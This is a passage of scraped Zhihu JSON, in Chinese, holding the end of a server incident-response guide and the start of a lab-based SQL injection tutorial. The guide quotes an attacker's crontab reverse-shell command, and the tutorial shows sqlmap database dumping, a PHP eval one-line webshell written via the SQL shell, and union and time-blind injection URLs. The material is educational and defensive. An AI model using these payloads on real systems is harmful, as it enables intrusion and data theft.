proc</p><p>内网扫描：网络nmap/扫描器，socks5代理</p><p>确定是否有rootkit：rkhunter， chkrootkit， ps/netstat替换确认</p><p>6.后门清理排查</p><p>根据时间点做关联分析：查找那个时间段的所有文件；</p><p>一些小技巧：/tmp目录， ls –la，查看所有文件，注意隐藏的文件；</p><p>根据用户做时间关联：比如nobody；</p><p>7.其他机器的关联操作</p><p>其他机器和这台机器的网络连接 （日志查看）、相同业务情况（同样业务，负载均衡）</p><h2><b>八、整理事件报告（安全人员）</b></h2><p>事件报告应包含但不限于以下几个点：</p><p>分析事件发生原因：事件为什么会发生的原因；</p><p>分析整个攻击流程：时间点、操作；</p><p>分析事件处理过程：整个事件处理过程总结是否有不足；</p><p>分析事件预防：如何避免事情再次发生；</p><p>总结：总结事件原因，改进处理过程，预防类似事件再次发生。</p><h2><b>九、处理中的遇到的比较棘手的事情</b></h2><p>1.日志和操作记录全被删了怎么办?</p><p>strace 查看 losf 进程，再尝试恢复一下日志记录，不行的话镜像硬盘数据慢慢查。这个要用到一些取证工具了，dd硬盘数据再去还原出来。</p><p>2.系统账号密码都修改了，登不进去?</p><p>重启进单用户模式修改root密码，或者通过控制卡操作，或者直接还原系统。都搞不定就直接重装吧。</p><p>3.使用常见的入侵检测命令未发现异常进程，但是机器在对外发包，这是怎么回事？</p><p>这种情况下很可能常用的系统命令已经被攻击者或者木马程序替换，可以通过md5sum对比本机二进制文件与正常机器的md5值是否一致，如果发现不一致，肯定是被替换了，可以从其他机器上拷贝命令到本机替换，或者alias为其他名称，避免为恶意程序再次替换。</p><p>4.被getshell怎么办？</p><p>1、漏洞修复前，系统立即下线，用内网环境访问。</p><p>2、上传点放到内网访问，不允许外网有类似的上传点，有上传点，而且没有校验文件类型很容易上传webshell。</p><p>3、被getshell的服务器中是否有敏感文件和数据库，如果有请检查是否有泄漏。</p><p>4、hosts文件中对应的host关系需要重新配置，攻击者可以配置hosts来访问测试环境。</p><p>5、重装系统</p><h2><b>案例分析</b></h2><p>上面讲了很多思路的东西，相信大家更想看看实际案例，下面介绍两个案例。</p><h2><b>别人的案例</b></h2><p>先讲一个别人处理的，基本处理过程就是：</p><p>通过外部端口扫描收集开放端口信息，然后获取到反弹shell信息，登陆机器发现关键命令已经被替换，后面查看history记录，发现疑似木马文件，通过简单逆向和进程查看发现了异常进程，从而锁定了入侵原因。具体内容可以查看：<u><a href=\"https://link.zhihu.com/?target=http%3A//www.freebuf.com/articles/system/50728.html%25E3%2580%2582\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">http://www.freebuf.com/articles/system/50728.html。</a></u></p><h2><b>笔者亲历的案例</b></h2><p>再讲一个笔者实际处理过的，基本处理流程跟上面提到的思路大同小异。整个事情处理经过大致如下：</p><p>1.运维发现一台私有云主机间歇性的对外发送高达800Mbps的流量，影响了同一个网段的其他机器。</p><p>2.安全人员接到通知后，先确认了机器属于备机，没有跑在线业务，于是通知运维封禁iptables限制外网访问。</p><p>3.运维为安全人员临时开通机器权限，安全人员通过history和ps找到的入侵记录和异常进程锁定了对外大量发包的应用程序，清理了恶意进程并删除恶意程序。</p><p>恶意进程如下，经过在网络搜索发现是一种ddos木马，但没有明确的处理思路：</p><div class=\"highlight\"><pre><code class=\"language-text\">/usr/bin/bsd-port/getty/usr/bin/acpid./dbuspm-session /sbin/DDosClient RunByP4407/sbin/DDosClient RunByPM4673</code></pre></div><p>处理过程中，安全人员怀疑系统文件被替换：</p><p>通过对比该机器与正常机器上面的ps、netstat等程序的大小发现敏感程序已经被替换，而且mtime也被修改。</p><p>正常机器</p><div class=\"highlight\"><pre><code class=\"language-text\">du -sh /bin/ps \n92K   /bin/ps\ndu -sh /bin/netstat \n92K  /bin/psn/netstat  </code></pre></div><p>被入侵机器</p><div class=\"highlight\"><pre><code class=\"language-text\">du -sh /bin/netstat\n2.0M    /bin/netstat\ndu -sh /bin/ps\n2.0M    /bin/ps</code></pre></div><p>将部分常用二进制文件修复后，发现异常进程被kill掉后仍重启了，于是安装杀毒软件clamav和rootkit hunter进行全盘扫描，从而确认了被感染的所有文件，将那些可以删除的文件删除后再次kill掉异常进程，则再没有重启的问题。</p><p>4.影响范围评估：</p><p>由于该机器只是备机，上面没有敏感数据，于是信息泄露问题也就不存在了。</p><p>扫描同一网段机器端口开放情况、排查被入侵机器history是否有对外扫描或者入侵行为，为此还在该网段机器另外部署蜜罐进行监控。</p><p>5深入分析入侵原因</p><p>通过被入侵机器所跑服务、iptables状态，确认是所跑服务支持远程命令执行，且机器iptables为空导致黑客通过往/etc/crontab中写“bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1”命令方式进行shell反弹，从而入侵了机器。</p><p>6.验证修复、机器下线重装</p><p>进行以上修复操作后，监控未发现再有异常，于是将机器下线重装。</p><p>7.完成安全事件处理报告</p><p>每次安全事件处理后，都应当整理成报告，不管是知识库的构建，还是统计分析安全态势，都是很有必要的。</p><p>这次主要介绍了服务器被入侵时推荐的一套处理思路。实际上，安全防护跟运维思路一样，都是要防患于未然，这时候的审计或者响应其实很难避免危害的发生了，我们更希望通过安全意识教育、安全制度的建设，将安全问题在尚未显露端倪时即可消弭于无形。</p><p class=\"ztext-empty-paragraph\"><br/></p><p>彩蛋：笔者已将Linux与Windows的安全应急响应流程工具化，稍后会开源到github。</p>", 
            "topic": [
                {
                    "tag": "入侵", 
                    "tagLink": "https://api.zhihu.com/topics/19605937"
                }, 
                {
                    "tag": "服务器", 
                    "tagLink": "https://api.zhihu.com/topics/19554575"
                }, 
                {
                    "tag": "网络安全", 
                    "tagLink": "https://api.zhihu.com/topics/19554927"
                }
            ], 
            "comments": [
                {
                    "userName": "特拉法尔加劳", 
                    "userLink": "https://www.zhihu.com/people/fe1964fc4c7b3549b0ec7e151361afe4", 
                    "content": "<p>您好，最近研究日志安全，关于 history 记录命令执行，若是 shell 命令不是通过命令行手动执行，而是写在脚本里执行或者通过程序 ssh 连接执行的，不会记录在 history 里怎么查看呢？</p>", 
                    "likes": 0, 
                    "childComments": [
                        {
                            "userName": "知乎用户", 
                            "userLink": "https://www.zhihu.com/people/0", 
                            "content": "要hook系统调用，具体可以参考sysdig或者auditd的原理，history其实很容易逃绕过", 
                            "likes": 0, 
                            "replyToAuthor": "特拉法尔加劳"
                        }, 
                        {
                            "userName": "知乎用户", 
                            "userLink": "https://www.zhihu.com/people/0", 
                            "content": "要记录系统执行命令，最有效的还是要hook系统syscall，你安装auditd看一下就知道了。也可以尝试修改系统shell，增加hook打log到syslog。", 
                            "likes": 0, 
                            "replyToAuthor": "特拉法尔加劳"
                        }
                    ]
                }
            ]
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/43454259", 
            "userName": "tuhao", 
            "userLink": "https://www.zhihu.com/people/5353f3263f6ecf860f2db3e773960f09", 
            "upvote": 3, 
            "title": "永不落幕的数据库注入攻防", 
            "content": "<h2><b>永不落幕的数据库注入攻防</b></h2><p>我记得之前有人说过，对于一家软件公司来说，最重要的不是它的办公楼，也不是它的股票，而是代码。代码这东西，说到底就是一堆数据。这话不假，但是不仅仅这样。对于一家企业来说，它的用户数据也是最重要的几个之一。在座各位想必多为DBA或者数据分析相关岗位的同学，对数据于企业的重要性，应该理解很深刻了。那么，换一个角度，站在用户角度，数据对他而言，更是要害。从以前的“艳照门”、“电信诈骗”，到现在的“<a href=\"https://link.zhihu.com/?target=http%3A//www.baidu.com/link%3Furl%3DjORb80BpHUcOLMEKWvr6VgNPrETkvXkxLJ8hFFLce8SEl_PcQwv20kstDn6_UHK4dPH91o-gamI18uuiI4Qb7K\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">50亿条公民信息泄露</a>”，数据泄漏每天都在发生着。所以，不管是谁，站在企业还是用户角度，保护数据安全是重中之重。今天的主题，“数据库注入攻防”就属于数据安全这个领域的问题了。</p><h2><b>数据库能有什么安全问题？</b></h2><h2><b>那些年泄漏的数据</b></h2><p>说起数据库安全问题，大家有很多答案，可能因暴露外网被攻击，可能因架构或网络原因破坏数据一致性，可能因备份还原机制不可用丢数据。但对于企业、用户来说，数据泄漏却是一个特别突出的问题。这里贴一张图，如图1，过去10年，中国互联网泄漏的10亿多条用户信息，不过跟最新泄漏的“50亿条公民信息”相比，简直小巫见大巫。现在这些数据库在互联网早传了遍，网上很多“社工库”的数据，如图2，就是从这里来的，但是还有很多是不公开的，还在地下买卖，恐怕我们现在知道的数据泄漏只是冰山一角。</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-bfb6da3c3df28820158db00348f75f0d_b.jpg\" data-size=\"normal\" data-rawwidth=\"576\" data-rawheight=\"426\" class=\"origin_image zh-lightbox-thumb\" width=\"576\" data-original=\"https://pic2.zhimg.com/v2-bfb6da3c3df28820158db00348f75f0d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;576&#39; height=&#39;426&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"576\" data-rawheight=\"426\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"576\" data-original=\"https://pic2.zhimg.com/v2-bfb6da3c3df28820158db00348f75f0d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-bfb6da3c3df28820158db00348f75f0d_b.jpg\"/><figcaption>图1</figcaption></figure><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-b7cc26a55088fc6a3bdde4017b68d4bf_b.jpg\" data-size=\"normal\" data-rawwidth=\"608\" data-rawheight=\"281\" class=\"origin_image zh-lightbox-thumb\" width=\"608\" data-original=\"https://pic4.zhimg.com/v2-b7cc26a55088fc6a3bdde4017b68d4bf_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;608&#39; height=&#39;281&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"608\" data-rawheight=\"281\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"608\" data-original=\"https://pic4.zhimg.com/v2-b7cc26a55088fc6a3bdde4017b68d4bf_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-b7cc26a55088fc6a3bdde4017b68d4bf_b.jpg\"/><figcaption>图2</figcaption></figure><h2><b>泄漏的数据哪来的？</b></h2><p>那么，问题来了，这些数据是怎么泄漏的？根据搜狐网上的一些报道，我按类型整理了大概有6种途径，分成用户提供和不法分子利用2个大类，占比大概如图3所示。</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-17345b51e84f83b403fa987573b21be1_b.jpg\" data-size=\"normal\" data-rawwidth=\"351\" data-rawheight=\"231\" class=\"content_image\" width=\"351\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;351&#39; height=&#39;231&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"351\" data-rawheight=\"231\" class=\"content_image lazy\" width=\"351\" data-actualsrc=\"https://pic2.zhimg.com/v2-17345b51e84f83b403fa987573b21be1_b.jpg\"/><figcaption>图3</figcaption></figure><p><b>用户提供</b></p><p>首先，用户随意连接免费WIFI或者扫描二维码被盗取个人信息；此外，手机、电脑等终端感染病毒等恶意软件，也会造成个人信息被窃取。但是这些都是因为用户自己的主动行为引起的。</p><p><b>不法分子利用</b> </p><p>这种主要是包括黑客在内的不法分子主动获取造成。比如：</p><p>掌握了信息的公司、机构员工主动倒卖信息；</p><p>黑客利用网站漏洞，入侵数据库，换句话说，这就是数据库注入引发的一个个血案；</p><p>用户密码简单，“一套密码走天下”，结果黑客通过“撞库”等间接方式也获取了用户帐号密码；</p><p>个人身份信息保管不当被利用，比如身份证复印件乱丢，轻易相信网购优惠填写身份证、银行卡信息，从而造成信息泄漏。</p><p>今天，我们将从原理、攻防等方面去剖析数据库注入。</p><h2><b>何为数据库注入</b></h2><h2><b>原理</b></h2><p>通过把恶意SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，从而欺骗服务器执行恶意的SQL命令，而不是按照设计者意图去执行SQL语句。从图4可以看到，正常用户输入的是自己的账号密码，但是攻击者不会按开发者想法来，他会用各种畸形输入来测试，比如图4就是传说中的“万能密码”，10年前，很多网站倒在它面前，就是因为完全信任用户输入。</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-a74250a420384c2c2110e18403981ef1_b.jpg\" data-size=\"normal\" data-rawwidth=\"300\" data-rawheight=\"225\" class=\"content_image\" width=\"300\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;300&#39; height=&#39;225&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"300\" data-rawheight=\"225\" class=\"content_image lazy\" width=\"300\" data-actualsrc=\"https://pic2.zhimg.com/v2-a74250a420384c2c2110e18403981ef1_b.jpg\"/><figcaption>图4</figcaption></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2><b>有什么危害</b></h2><p>非法读取、篡改、添加、删除数据库中的数据</p><p>盗取用户的各类敏感信息，获取利益</p><p>通过修改数据库来修改网页上的内容</p><p>私自添加或删除账号</p><p>注入木马等等</p><p>看起来数据库注入的危害可不知信息泄漏，破坏数据库数据和进一步入侵也是入侵的题中应有之义。</p><h2><b>跟其他的web攻击如xss/csrf/ssrf之类比有什么不同</b></h2><p>危害最大</p><p>根据OWASP（Open Web Application Security Project）2013年安全报告，如图5，数据库注入是最严重的web安全问题。</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-dd91e4629d2142d8f2d27fed474bb3f2_b.jpg\" data-size=\"normal\" data-rawwidth=\"1130\" data-rawheight=\"224\" class=\"origin_image zh-lightbox-thumb\" width=\"1130\" data-original=\"https://pic3.zhimg.com/v2-dd91e4629d2142d8f2d27fed474bb3f2_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1130&#39; height=&#39;224&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"1130\" data-rawheight=\"224\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1130\" data-original=\"https://pic3.zhimg.com/v2-dd91e4629d2142d8f2d27fed474bb3f2_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-dd91e4629d2142d8f2d27fed474bb3f2_b.jpg\"/><figcaption>图5</figcaption></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>直接攻击数据库，而数据是最敏感的</p><p>容易被深度利用，造成威胁扩散</p><p>刚才上面也提到，数据库注入可以用来传播木马，甚至控制服务器，想想空间很大。</p><h2><b>数据库注入攻击实战</b> </h2><p>在网络安全行业有一句话，“未知攻，焉知防”。所以我们要理解数据库注入，要做好防御措施，先来看看它是怎么攻击我们数据库的。</p><h2><b>利用思路</b></h2><p>攻击一般可以采用手工和自动化工具两种方式，各有千秋。</p><p>手工：</p><p>繁琐、效率低；灵活、能够根据站点防护措施随时调整攻击思路。</p><p>工具：</p><p>效率高、批量自动挖掘；但是容易被waf（web防火墙）识别、模式相对单一，不够灵活。但还在，事在人为，工具可以跟人一样聪明，下面我们就利用神器让注入“飞起来”吧。</p><p>主要会用到下面几款工具。</p><p>Nmap：社区最著名端口扫描工具。</p><p>AWVS：商业级web漏洞扫描工具，准确率和效率名列漏扫工具Top3。</p><p>Sqlmap.py：全自动sql注入工具，神器之“神”。</p><p>Nosqlmap.py：Sqlmap的Nosql版本，支持Mongodb等。</p><p>Webshell：web木马，攻城略地不可或缺。</p><h2><b>渗透测试环境</b></h2><p>要知道，在欧美，扫描别人网站也可能违法，更别说入侵网站了。同理，我们的测试，也仅使用模拟环境。下面有很多web渗透的模拟环境，部署起来非常简单。</p><p><a href=\"https://link.zhihu.com/?target=https%3A//github.com/ethicalhack3r/DVWA\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">github.com/ethicalhack3</span><span class=\"invisible\">r/DVWA</span><span class=\"ellipsis\"></span></a></p><p><a href=\"https://link.zhihu.com/?target=https%3A//github.com/WebGoat/WebGoat\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">github.com/WebGoat/WebG</span><span class=\"invisible\">oat</span><span class=\"ellipsis\"></span></a></p><p><a href=\"https://link.zhihu.com/?target=https%3A//github.com/Audi-1/sqli-labs\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">github.com/Audi-1/sqli-</span><span class=\"invisible\">labs</span><span class=\"ellipsis\"></span></a></p><p><a href=\"https://link.zhihu.com/?target=https%3A//hack.me/t/SQLi\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">hack.me/t/SQLi</span><span class=\"invisible\"></span></a></p><p><a href=\"https://link.zhihu.com/?target=https%3A//github.com/davevs/dvxte\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">github.com/davevs/dvxte</span><span class=\"invisible\"></span></a></p><p><a href=\"https://link.zhihu.com/?target=https%3A//github.com/rapid7/metasploitable3\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">github.com/rapid7/metas</span><span class=\"invisible\">ploitable3</span><span class=\"ellipsis\"></span></a></p><h2><b>全景图</b></h2><p>在开始测试前，先整理一遍思路。通常渗透测试，会遵循：信息采集、入口发现、入口测试、获取webshell、提权等步骤。下面大概介绍下每个环节需要做的事情。</p><p>收集信息：通过端口扫描工具、搜索引擎或者目录爆破工具收集敏感信息或者端口开放信息，以便作为测试入口。</p><p>注入：一般说是入口发现，我们这次是web站点存在sql注入，然后通过手工尝试PoC（漏洞验证payload）或者自动化工具测试，一旦发现sql注入点，立马开始遍历数据库，俗称“脱库”。但是，别忘了世纪佳缘白帽子事件，殷鉴不远啊。</p><p>Getshell：基于sql注入上传木马，获取服务器控制权限。</p><p>提权：基于已有的普通用户权限，利用系统内核漏洞或者应用漏洞，将自己升级到root用户。</p><p>进阶：思路足够广，要多深入有多深入。</p><h2><b>发现漏洞</b></h2><p>nmap -p1-65535 192.168.115.131</p><p>发现开放tcp/80端口，为web服务，手工验证注入入口。发现<a href=\"https://link.zhihu.com/?target=http%3A//192.168.115.181/cat.php%3Fid%3D1\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://</span><span class=\"visible\">192.168.115.181/cat.php?</span><span class=\"invisible\">id=1</span><span class=\"ellipsis\"></span></a>存在sql注入。使用awvs进行进一步验证，如图6。</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-d47d7a1aaed49316a982ea99cdcaa1f4_b.jpg\" data-size=\"normal\" data-rawwidth=\"1179\" data-rawheight=\"403\" class=\"origin_image zh-lightbox-thumb\" width=\"1179\" data-original=\"https://pic1.zhimg.com/v2-d47d7a1aaed49316a982ea99cdcaa1f4_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1179&#39; height=&#39;403&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"1179\" data-rawheight=\"403\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1179\" data-original=\"https://pic1.zhimg.com/v2-d47d7a1aaed49316a982ea99cdcaa1f4_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-d47d7a1aaed49316a982ea99cdcaa1f4_b.jpg\"/><figcaption>图6</figcaption></figure><h2><b>脱库</b></h2><p>使用sqlmap全自动脱库，扫出数据库、表名、列等信息。</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-7c486340773af93a5aa49db3a7602488_b.jpg\" data-size=\"normal\" data-rawwidth=\"1350\" data-rawheight=\"597\" class=\"origin_image zh-lightbox-thumb\" width=\"1350\" data-original=\"https://pic1.zhimg.com/v2-7c486340773af93a5aa49db3a7602488_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1350&#39; height=&#39;597&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"1350\" data-rawheight=\"597\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1350\" data-original=\"https://pic1.zhimg.com/v2-7c486340773af93a5aa49db3a7602488_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-7c486340773af93a5aa49db3a7602488_b.jpg\"/><figcaption>图7</figcaption></figure><h2><b>Getshell</b></h2><p>也是使用sqlmap直接在sql shel里写文件，当然也可以切换到--os-shell获取操作系统shell直接执行系统命令，如图8。</p><div class=\"highlight\"><pre><code class=\"language-text\"> sqlmap.py -u http://192.168.115.131:80/cat.php?id=1 --dbms mysql --sql-shell\n&gt;sql-shell: select &#39;&lt;? php eval($_POST[cmd]);?&gt;&#39; into outfile &#39;/var/www/2011.php.test&#39;;</code></pre></div><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-60cad6118e350f14441d7186a4b920fc_b.jpg\" data-size=\"normal\" data-rawwidth=\"1361\" data-rawheight=\"662\" class=\"origin_image zh-lightbox-thumb\" width=\"1361\" data-original=\"https://pic1.zhimg.com/v2-60cad6118e350f14441d7186a4b920fc_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1361&#39; height=&#39;662&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"1361\" data-rawheight=\"662\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1361\" data-original=\"https://pic1.zhimg.com/v2-60cad6118e350f14441d7186a4b920fc_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-60cad6118e350f14441d7186a4b920fc_b.jpg\"/><figcaption>图8</figcaption></figure><p>传说中的“一句话木马”、“小马”、“大马”，这里科普一下，“一句话木马”就是将接收任意字符进行执行的php/asp/jsp文件，通常只有几行，甚至只有一行；“小马”就是“一句话木马”或者功能比较简单的web木马，“大马”就是功能齐全的web木马，比如图8所示，可以管理文件、数据库、执行系统命令、端口扫描甚至端口转发。</p><h2><b>提权</b></h2><p>从普通用户变成root用户。这个需要利用操作系统内核版本漏洞，所幸该内核版本（图9）很低，真找到了内核exp（图10），顺利提权。</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-19fa20f88505bf9e2c62f3b93e6f6340_b.jpg\" data-size=\"normal\" data-rawwidth=\"714\" data-rawheight=\"121\" class=\"origin_image zh-lightbox-thumb\" width=\"714\" data-original=\"https://pic1.zhimg.com/v2-19fa20f88505bf9e2c62f3b93e6f6340_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;714&#39; height=&#39;121&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"714\" data-rawheight=\"121\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"714\" data-original=\"https://pic1.zhimg.com/v2-19fa20f88505bf9e2c62f3b93e6f6340_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-19fa20f88505bf9e2c62f3b93e6f6340_b.jpg\"/><figcaption>图9</figcaption></figure><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-2650c93f0591e9f49d632a5136f0dbd8_b.jpg\" data-size=\"normal\" data-rawwidth=\"657\" data-rawheight=\"649\" class=\"origin_image zh-lightbox-thumb\" width=\"657\" data-original=\"https://pic1.zhimg.com/v2-2650c93f0591e9f49d632a5136f0dbd8_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;657&#39; height=&#39;649&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"657\" data-rawheight=\"649\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"657\" data-original=\"https://pic1.zhimg.com/v2-2650c93f0591e9f49d632a5136f0dbd8_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-2650c93f0591e9f49d632a5136f0dbd8_b.jpg\"/><figcaption>图10</figcaption></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2><b>进阶利用</b></h2><p>提完权就算了？没这么简单，如果处于攻击目的，实际上可做的事情太多了。</p><p>内网漫游：一般数据库都放在内网，我们都知道企业内网很多“宝藏”，各种空口令、弱密码、目录遍历，随便扫一下就大丰收了，如图11。</p><p>流量劫持：arp攻击、ssl流量劫持、抓包上传甚至攻击域控服务器等等，都深入到这程度，真没什么做不到的。</p><p>DDoS肉鸡：控制被入侵机器去攻击别人，当你发现某台服务器出向流量异常高就该担心了，如图12。</p><p>远控：监控机器，比如键盘记录、用户命令记录等等。</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-97ed27f2401add1c153dcf4a40d067a8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"716\" data-rawheight=\"98\" class=\"origin_image zh-lightbox-thumb\" width=\"716\" data-original=\"https://pic1.zhimg.com/v2-97ed27f2401add1c153dcf4a40d067a8_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;716&#39; height=&#39;98&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"716\" data-rawheight=\"98\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"716\" data-original=\"https://pic1.zhimg.com/v2-97ed27f2401add1c153dcf4a40d067a8_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-97ed27f2401add1c153dcf4a40d067a8_b.jpg\"/></figure><p>刚才完整介绍了一个自动sql注入攻击的过程，可能大家觉得还是不够过瘾，因为一路只看我在使用工具，连畸形sql语句都没看到，所以下面针对Mysql、MSSQL、Oracle等主流关系型数据库的手工注入大概介绍下。</p><h2><b>Mysql</b></h2><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-b6c6d7b1d8e2035a962e4dd65efac89f_b.jpg\" data-size=\"normal\" data-rawwidth=\"771\" data-rawheight=\"318\" class=\"origin_image zh-lightbox-thumb\" width=\"771\" data-original=\"https://pic4.zhimg.com/v2-b6c6d7b1d8e2035a962e4dd65efac89f_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;771&#39; height=&#39;318&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"771\" data-rawheight=\"318\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"771\" data-original=\"https://pic4.zhimg.com/v2-b6c6d7b1d8e2035a962e4dd65efac89f_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-b6c6d7b1d8e2035a962e4dd65efac89f_b.jpg\"/><figcaption>图13</figcaption></figure><p><u><a href=\"https://link.zhihu.com/?target=http%3A//192.168.115.131/cat.php%3Fid%3D1%2527\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">http://192.168.115.131/cat.php?id=1&#39;</a></u></p><p>直接在参数后面跟上’，或者\\，如果没有合理过滤，是会报语法错误的，不信你看看图13。</p><p><u><a href=\"https://link.zhihu.com/?target=http%3A//192.168.115.131/cat.php%3Fid%3D1%2520and%25201%3D2%2520union%2520select%25201%2Cuser%28%29%2C3%2C4\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://</span><span class=\"visible\">192.168.115.131/cat.php?</span><span class=\"invisible\">id=1%20and%201=2%20union%20select%201,user(),3,4</span><span class=\"ellipsis\"></span></a></u></p><p>然后开始试探数据库字段数、当前用户，如图14。</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-b6c6d7b1d8e2035a962e4dd65efac89f_b.jpg\" data-size=\"normal\" data-rawwidth=\"771\" data-rawheight=\"318\" class=\"origin_image zh-lightbox-thumb\" width=\"771\" data-original=\"https://pic4.zhimg.com/v2-b6c6d7b1d8e2035a962e4dd65efac89f_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;771&#39; height=&#39;318&#39;&gt;&lt;/svg&gt;\" data-size=\"normal\" data-rawwidth=\"771\" data-rawheight=\"318\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"771\" data-original=\"https://pic4.zhimg.com/v2-b6c6d7b1d8e2035a962e4dd65efac89f_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-b6c6d7b1d8e2035a962e4dd65efac89f_b.jpg\"/><figcaption>图14</figcaption></figure><p><a href=\"https://link.zhihu.com/?target=http%3A//192.168.115.131/cat.php%3Fid%3D1\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://</span><span class=\"visible\">192.168.115.131/cat.php?</span><span class=\"invisible\">id=1</span><span class=\"ellipsis\"></span></a> and (select * from (select(sleep(5)))lsrk)</p><p><a 